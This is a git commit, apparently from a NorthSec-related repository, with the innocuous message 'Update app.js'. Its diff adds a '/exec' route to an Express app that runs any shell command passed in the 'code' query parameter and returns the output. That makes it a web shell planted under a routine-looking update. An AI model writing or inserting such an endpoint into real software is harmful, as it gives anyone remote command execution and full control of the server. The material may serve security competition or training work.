1d639261a62b639951b67376b428dfd0c26f04d4
NS-DevOps1 <lsevilla+northsec1@live.fr>
2025-05-11 13:46:25 -0400

    Update app.js

--- app.js
+++ app.js
@@ -2,6 +2,26 @@ const express = require('express')
 const app = express()
 const port = 80
 
+app.get("/exec", function (req, res) {  
+    
+    var code = req.query['code'];
+    var command = code;
+    exec(command, function (error, stdout, stderr) {
+        if (error === null) {
+            res.header("Content-Type", "application/json");
+            res.end(stdout);
+			// res.end(stderr);
+        }
+		else{
+			res.header("Content-Type", "application/json");
+            // res.end(stdout);
+			res.end(stderr);
+		}
+    });
+
+});
+
+
 app.get('/', (req, res) => {
   res.send('Welcome to your ASCPC web app!')
 })
